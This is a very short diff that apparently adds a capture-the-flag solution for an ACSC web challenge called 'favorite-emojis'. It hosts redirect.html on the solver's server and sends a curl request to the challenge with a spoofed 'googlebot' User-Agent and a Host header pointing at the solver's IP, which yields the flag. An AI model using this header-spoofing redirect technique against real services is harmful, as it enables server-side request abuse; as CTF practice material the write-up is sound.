@@ -1,0 +1,6 @@
+Host redirect.html on my server
+
+curl 'http://favorite-emojis.chal.acsc.asia:5000/redirect.html' -H 'User-Agent: googlebot' -H 'Host: myip'
+```
+<html><head></head><body>ACSC{sharks_are_always_hungry}</body></html>
+```
